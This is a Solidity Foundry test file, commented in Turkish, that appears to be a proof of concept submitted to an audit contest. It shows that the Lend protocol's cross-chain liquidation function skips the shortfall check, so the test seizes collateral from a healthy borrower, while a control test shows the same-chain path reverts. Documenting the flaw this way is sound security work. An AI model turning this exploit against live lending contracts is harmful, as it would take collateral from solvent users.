// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

// =============================================================================
// PoC — Cross-chain likidasyonda shortfall (batıklık) kontrolü eksik
//
// Hedef: Sherlock 2025-05-lend-audit-contest (Lend, Compound V2 + LayerZero)
// Bulgu: CrossChainRouter.liquidateCrossChain, borçlunun gerçekten batık
//        (teminat < borç) olduğunu doğrulamıyor. Aynı-zincir yol doğruluyor.
//
// Bu PoC iki şeyi gösterir:
//   1. SAĞLIKLI bir cross-chain pozisyon liquidateCrossChain ile likidite
//      EDİLEBİLİYOR (revert etmesi gerekirken etmiyor)  -> AÇIK.
//   2. Aynı SAĞLIKLI senaryoda aynı-zincir liquidateBorrow "Insufficient
//      shortfall" ile revert ediyor  -> beklenen doğru davranış.
//
// Kurulum: bu dosyayı klonlanmış yarışma reposunun Lend-V2/test/ klasörüne
//          koy ve şunu çalıştır:
//     forge test --match-contract PoC_CrossChainLiquidationNoShortfall -vvv
//
// NOT: Bu ortamda çalıştırılamadı çünkü org ağ politikası Foundry
//      toolchain indirmesini engelliyor. Kod yerelde çalışmaya hazırdır.
// =============================================================================

import {Test, console2} from "forge-std/Test.sol";
import {Deploy} from "../script/Deploy.s.sol";
import {HelperConfig} from "../script/HelperConfig.s.sol";
import {CrossChainRouterMock} from "./mocks/CrossChainRouterMock.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {Lendtroller} from "../src/Lendtroller.sol";
import {InterestRateModel} from "../src/InterestRateModel.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {LTokenInterface} from "../src/LTokenInterfaces.sol";
import {LToken} from "../src/LToken.sol";
import "@layerzerolabs/lz-evm-oapp-v2/test/TestHelper.sol";
import "@layerzerolabs/lz-evm-protocol-v2/test/utils/LayerZeroTest.sol";

contract PoC_CrossChainLiquidationNoShortfall is LayerZeroTest {
    HelperConfig public helperConfig;
    address[] public supportedTokensA;
    address[] public supportedTokensB;
    address public deployer;
    address public liquidator;

    // Chain A (teminat burada)
    CrossChainRouterMock public routerA;
    LendStorage public lendStorageA;
    CoreRouter public coreRouterA;
    Lendtroller public lendtrollerA;
    InterestRateModel public interestRateModelA;
    SimplePriceOracle public priceOracleA;
    address[] public lTokensA;

    // Chain B (borç burada)
    CrossChainRouterMock public routerB;
    LendStorage public lendStorageB;
    CoreRouter public coreRouterB;
    Lendtroller public lendtrollerB;
    InterestRateModel public interestRateModelB;
    SimplePriceOracle public priceOracleB;
    address[] public lTokensB;

    uint32 constant CHAIN_A_ID = 1;
    uint32 constant CHAIN_B_ID = 2;

    EndpointV2 public endpointA;
    EndpointV2 public endpointB;

    function setUp() public override(LayerZeroTest) {
        super.setUp();

        deployer = makeAddr("deployer");
        liquidator = makeAddr("liquidator");
        vm.deal(deployer, 1000 ether);
        vm.deal(liquidator, 1000 ether);

        // Not: bu kurulum yarışmanın TestLiquidations.t.sol harness'ıyla birebir
        // aynıdır. CrossChainRouterMock kullanıldığı için endpointA/endpointB
        // atanmaz (address(0) kalır) — mock router eşine doğrudan çağrı yapar.

        Deploy deployA = new Deploy();
        (
            address priceOracleAddressA,
            address lendtrollerAddressA,
            address interestRateModelAddressA,
            address[] memory lTokenAddressesA,
            address payable routerAddressA,
            address payable coreRouterAddressA,
            address lendStorageAddressA,
            ,
            address[] memory _supportedTokensA
        ) = deployA.run(address(endpointA));

        routerA = CrossChainRouterMock(payable(routerAddressA));
        lendStorageA = LendStorage(lendStorageAddressA);
        coreRouterA = CoreRouter(coreRouterAddressA);
        lendtrollerA = Lendtroller(lendtrollerAddressA);
        interestRateModelA = InterestRateModel(interestRateModelAddressA);
        priceOracleA = SimplePriceOracle(priceOracleAddressA);
        lTokensA = lTokenAddressesA;
        supportedTokensA = _supportedTokensA;

        Deploy deployB = new Deploy();
        (
            address priceOracleAddressB,
            address lendtrollerAddressB,
            address interestRateModelAddressB,
            address[] memory lTokenAddressesB,
            address payable routerAddressB,
            address payable coreRouterAddressB,
            address lendStorageAddressB,
            ,
            address[] memory _supportedTokensB
        ) = deployB.run(address(endpointB));

        routerB = CrossChainRouterMock(payable(routerAddressB));
        lendStorageB = LendStorage(lendStorageAddressB);
        coreRouterB = CoreRouter(coreRouterAddressB);
        lendtrollerB = Lendtroller(lendtrollerAddressB);
        interestRateModelB = InterestRateModel(interestRateModelAddressB);
        priceOracleB = SimplePriceOracle(priceOracleAddressB);
        lTokensB = lTokenAddressesB;
        supportedTokensB = _supportedTokensB;

        // Cross-chain eşlemeleri
        vm.startPrank(routerA.owner());
        for (uint256 i = 0; i < supportedTokensA.length; i++) {
            lendStorageA.addUnderlyingToDestUnderlying(supportedTokensA[i], supportedTokensB[i], CHAIN_B_ID);
            lendStorageA.addUnderlyingToDestlToken(supportedTokensA[i], lTokensB[i], CHAIN_B_ID);
            lendStorageA.setChainAssetMap(supportedTokensA[i], block.chainid, supportedTokensB[i]);
            lendStorageA.setChainLTokenMap(lTokensA[i], block.chainid, lTokensB[i]);
            lendStorageA.setChainLTokenMap(lTokensB[i], block.chainid, lTokensA[i]);
        }
        vm.stopPrank();

        vm.startPrank(routerB.owner());
        for (uint256 i = 0; i < supportedTokensB.length; i++) {
            lendStorageB.addUnderlyingToDestUnderlying(supportedTokensB[i], supportedTokensA[i], CHAIN_A_ID);
            lendStorageB.addUnderlyingToDestlToken(supportedTokensB[i], lTokensA[i], CHAIN_A_ID);
            lendStorageB.setChainAssetMap(supportedTokensB[i], block.chainid, supportedTokensA[i]);
            lendStorageB.setChainLTokenMap(lTokensB[i], block.chainid, lTokensA[i]);
            lendStorageB.setChainLTokenMap(lTokensA[i], block.chainid, lTokensB[i]);
        }
        vm.stopPrank();

        // Başlangıç fiyatları: hepsi 1e18 (ve PoC boyunca DÜŞÜRÜLMEYECEK)
        for (uint256 i = 0; i < supportedTokensA.length; i++) {
            priceOracleA.setDirectPrice(supportedTokensA[i], 1e18);
        }
        for (uint256 i = 0; i < supportedTokensB.length; i++) {
            priceOracleB.setDirectPrice(supportedTokensB[i], 1e18);
        }

        routerA.setPairContract(payable(address(routerB)));
        routerB.setPairContract(payable(address(routerA)));
    }

    // --- yardımcılar (harness ile aynı) ---
    function _supplyA(address user, uint256 amount, uint256 tokenIndex) internal returns (address token, address lToken) {
        vm.deal(address(routerA), 1 ether);
        token = supportedTokensA[tokenIndex];
        lToken = lendStorageA.underlyingTolToken(token);
        vm.startPrank(user);
        ERC20Mock(token).mint(user, amount);
        IERC20(token).approve(address(coreRouterA), amount);
        coreRouterA.supply(amount, token);
        vm.stopPrank();
    }

    function _supplyB(address user, uint256 amount, uint256 tokenIndex) internal returns (address token, address lToken) {
        vm.deal(address(routerB), 1 ether);
        token = supportedTokensB[tokenIndex];
        lToken = lendStorageB.underlyingTolToken(token);
        vm.startPrank(user);
        ERC20Mock(token).mint(user, amount);
        IERC20(token).approve(address(coreRouterB), amount);
        coreRouterB.supply(amount, token);
        vm.stopPrank();
    }

    /// SAĞLIKLI cross-chain borç kurar: teminat A'da, borç B'de, FİYAT DÜŞMEZ.
    function _setupHealthyCrossChainBorrow(uint256 supplyAmount, uint256 borrowAmount)
        internal
        returns (address tokenA, address lTokenA)
    {
        (tokenA, lTokenA) = _supplyA(deployer, supplyAmount, 0);
        _supplyB(liquidator, supplyAmount * 2, 0); // B'de likidite
        vm.deal(address(routerA), 1 ether); // LayerZero ücreti
        vm.startPrank(deployer);
        routerA.borrowCrossChain(borrowAmount, tokenA, CHAIN_B_ID);
        vm.stopPrank();
        // FİYAT DÜŞÜRÜLMEZ -> pozisyon sağlıklı kalır (teminat >> borç)
    }

    // =========================================================================
    // 1) AÇIK: sağlıklı pozisyon cross-chain likidite EDİLEBİLİYOR
    // =========================================================================
    function test_poc_crosschain_liquidation_of_HEALTHY_position_succeeds() public {
        uint256 supplyAmount = 1000e18;
        uint256 borrowAmount = 300e18; // %30 LTV -> açıkça sağlıklı, batık DEĞİL

        (address tokenA, address lTokenA) = _setupHealthyCrossChainBorrow(supplyAmount, borrowAmount);

        address tokenB = supportedTokensB[0];
        address lTokenB = lendStorageB.underlyingTolToken(tokenB);

        uint256 collBefore = lendStorageA.totalInvestment(deployer, lTokenA);
        assertGt(collBefore, 0, "borclu teminati olmali");

        // Likidatör sağlıklı pozisyonu likidite etmeyi dener
        vm.startPrank(liquidator);
        ERC20Mock(tokenB).mint(liquidator, 1e30);
        IERC20(tokenB).approve(address(coreRouterB), type(uint256).max);

        uint256 repayAmount = borrowAmount / 10;

        // DOĞRU protokolde bu çağrı "Insufficient shortfall" ile revert ETMELİ.
        // Açık nedeniyle revert ETMEZ ve teminat ele geçirilir:
        routerB.liquidateCrossChain(
            deployer,   // borrower (sağlıklı!)
            repayAmount,
            31337,      // teminatın olduğu chain (mock chainid)
            lTokenB,    // seize edilecek collateral lToken
            tokenB      // borrowed asset (Chain B versiyonu)
        );
        vm.stopPrank();

        uint256 collAfter = lendStorageA.totalInvestment(deployer, lTokenA);

        // AÇIĞIN KANITI: sağlıklı borçlunun teminatı azaldı (haksız seize).
        assertLt(collAfter, collBefore, "ACIK: saglikli pozisyonun teminati seize edildi");
        console2.log("Teminat (once):", collBefore);
        console2.log("Teminat (sonra):", collAfter);
        console2.log(">>> Saglikli pozisyon cross-chain likidite edildi -> shortfall kontrolu yok.");
    }

    // =========================================================================
    // 2) KONTROL: aynı-zincir yolda sağlıklı pozisyon revert ediyor (doğru)
    // =========================================================================
    function test_poc_samechain_liquidation_of_healthy_REVERTS() public {
        uint256 supplyAmount = 1000e18;
        uint256 borrowAmount = 300e18;

        // Aynı-zincir borç: teminat token0, borç token1, ikisi de Chain A
        (address tokenA, address lTokenA) = _supplyA(deployer, supplyAmount, 0);
        (address tokenB,) = _supplyA(address(1), supplyAmount, 1); // likidite
        vm.prank(deployer);
        coreRouterA.borrow(borrowAmount, tokenB); // sağlıklı borç, fiyat düşmez

        vm.startPrank(liquidator);
        ERC20Mock(tokenB).mint(liquidator, borrowAmount);
        IERC20(tokenB).approve(address(coreRouterA), borrowAmount);

        // Aynı-zincir yol shortfall kontrolü yapar -> revert BEKLENİR (doğru davranış)
        vm.expectRevert(bytes("Insufficient shortfall"));
        coreRouterA.liquidateBorrow(deployer, borrowAmount / 10, lTokenA, tokenB);
        vm.stopPrank();

        console2.log(">>> Ayni-zincir saglikli pozisyon revert etti -> dogru davranis.");
    }
}
